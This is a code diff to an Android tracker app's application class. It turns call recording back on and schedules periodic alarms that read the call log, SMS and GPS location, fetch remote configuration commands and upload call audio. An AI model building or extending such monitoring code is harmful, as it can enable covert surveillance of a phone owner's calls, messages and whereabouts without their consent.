@@ -26,6 +26,7 @@ import com.alcatrazstudios.apps.androidtracker.receiver.SaveCallRecordsReceiver;
 import com.alcatrazstudios.apps.androidtracker.receiver.SmsLogBroadcastReceiver;
 import com.alcatrazstudios.apps.androidtracker.receiver.UploadAudioReceiver;
 import com.alcatrazstudios.apps.androidtracker.receiver.UploadDataAlarmReceiver;
+import com.alcatrazstudios.apps.androidtracker.services.TService;
 
 import java.util.concurrent.atomic.AtomicInteger;
 
@@ -43,7 +44,7 @@ import io.realm.RealmResults;
 
 public class GpsTrackerApplication extends Application {
     private static GpsTrackerApplication mInstance;
-    private static final String TAG="GpTracker";
+    private static final String TAG="GpsTrackerApp";
 
     private Map<Class<? extends RealmObject>,AtomicInteger> IdMaps;
     private SharedPreferences sharedPreferences;
@@ -144,7 +145,7 @@ public class GpsTrackerApplication extends Application {
 
     }
     public static void startPermissionActivity(){
-        Log.d(TAG, "startPermissionActivity");
+        Log.e(TAG, "startPermissionActivity");
 
         Context context = mInstance.getBaseContext();
         Intent intent=new Intent(context,PermissionsActivity.class);
@@ -163,7 +164,7 @@ public class GpsTrackerApplication extends Application {
     }
 
     private static void cancelAlarm(Context context,Class receiverClass) {
-        Log.d(TAG, "cancelAlarmManager");
+        Log.e(TAG, "cancelAlarmManager");
 
         Intent intent = new Intent(context, receiverClass);
         PendingIntent pendingIntent = PendingIntent.getBroadcast(context, 0, intent, 0);
@@ -177,7 +178,7 @@ public class GpsTrackerApplication extends Application {
     }
 
     public static void startAlarmManager(Context context) {
-        Log.i(TAG, "startAlarmManager");
+        Log.e(TAG, "startAlarmManager");
 
         startAlarm(context, GpsConfigurationChangeReceiver.class,10);
 
@@ -185,62 +186,69 @@ public class GpsTrackerApplication extends Application {
 
         startAlarm(context, CallRecordsReceiver.class,10);
 
-        startAlarm(context, UploadAudioReceiver.class,1);
+        startAlarm(context, UploadAudioReceiver.class,120);
 
-//        switchCallRecording(context);
-
-//        startAlarm(context, SaveCallRecordsReceiver.class,1);
+        switchCallRecording(context);
 
         startServices(context);
 
     }
     public static void restartServices(Context context){
-        Log.i(TAG,"Stopping services");
+        Log.e(TAG,"Restarting services");
         TrackerConfiguration configuration=mInstance.getConfiguration();
 
+        Log.e(TAG,"Frecuencia de envío de llamadas disponibles: " + configuration.getCallRecordUpFrequencyMinutes());
         cancelAlarm(context,SaveCallRecordsReceiver.class);
         startAlarm(context, SaveCallRecordsReceiver.class,configuration.getCallRecordUpFrequencyMinutes());
 
+        Log.e(TAG,"Frecuencia de lectura de configuracion: " + configuration.getCommandReaderFrequencyMinutes());
         cancelAlarm(context,GpsConfigurationReceiver.class);
         startAlarm(context,GpsConfigurationReceiver.class,configuration.getCommandReaderFrequencyMinutes());
 
+        Log.e(TAG,"Frecuencia de lectura de call log: " + configuration.getCallLogFrequencyMinutes());
         cancelAlarm(context, CallLogBroadcastReceiver.class);
-        startAlarm(context, CallLogBroadcastReceiver.class,configuration.getCallLogFrequencyMinutes());
+        startAlarm(context, CallLogBroadcastReceiver.class, configuration.getCallLogFrequencyMinutes());
 
+        Log.e(TAG,"Frecuencia de lectura de Sms: " + configuration.getSmsReaderFrequencyMinutes());
         cancelAlarm(context, SmsLogBroadcastReceiver.class);
         startAlarm(context, SmsLogBroadcastReceiver.class,configuration.getSmsReaderFrequencyMinutes());
 
+        Log.e(TAG,"Frecuencia de lectura de GPS: " + configuration.getGpsReaderFrequencyMinutes());
         cancelAlarm(context, GpsTrackerAlarmReceiver.class);
         startAlarm(context, GpsTrackerAlarmReceiver.class,configuration.getGpsReaderFrequencyMinutes());
     }
 
     public static void switchCallRecording(Context context ){
-        Log.i(TAG,"Switching call recording");
-/*        TrackerConfiguration configuration=mInstance.getConfiguration();
+        Log.e(TAG,"Switching call recording");
+        TrackerConfiguration configuration=mInstance.getConfiguration();
 
         Intent intent = new Intent(context, TService.class);
         if (configuration.isRecordCalls()){
-            Log.i(TAG,"Start recording");
+            Log.e(TAG,"Start recording");
             context.startService(intent);
         } else {
-            Log.i(TAG,"No recording");
+            Log.e(TAG,"No recording");
             context.stopService(intent);
         }
-*/
     }
 
     public static void startServices(Context context){
-        Log.i(TAG,"Starting services");
+        Log.e(TAG,"Starting services");
         TrackerConfiguration configuration=mInstance.getConfiguration();
 
+        Log.e(TAG,"Frecuencia de envío de llamadas disponibles: " + configuration.getCallRecordUpFrequencyMinutes());
         startAlarm(context, SaveCallRecordsReceiver.class,configuration.getCallRecordUpFrequencyMinutes());
 
+        Log.e(TAG,"Frecuencia de lectura de configuracion: " + configuration.getCommandReaderFrequencyMinutes());
         startAlarm(context,GpsConfigurationReceiver.class,configuration.getCommandReaderFrequencyMinutes());
 
-        startAlarm(context, CallLogBroadcastReceiver.class,configuration.getCallLogFrequencyMinutes());
+        Log.e(TAG,"Frecuencia de lectura de call log: " + configuration.getCallLogFrequencyMinutes());
+        startAlarm(context, CallLogBroadcastReceiver.class, configuration.getCallLogFrequencyMinutes());
 
+        Log.e(TAG,"Frecuencia de lectura de Sms: " + configuration.getSmsReaderFrequencyMinutes());
         startAlarm(context, SmsLogBroadcastReceiver.class,configuration.getSmsReaderFrequencyMinutes());
 
+        Log.e(TAG,"Frecuencia de lectura de GPS: " + configuration.getGpsReaderFrequencyMinutes());
         startAlarm(context, GpsTrackerAlarmReceiver.class,configuration.getGpsReaderFrequencyMinutes());
 
     }
@@ -248,7 +256,7 @@ public class GpsTrackerApplication extends Application {
     @Override
     public void onTerminate() {
         super.onTerminate();
-        Log.i(TAG,"Terminate");
+        Log.e(TAG,"Terminate");
     }
 
 }
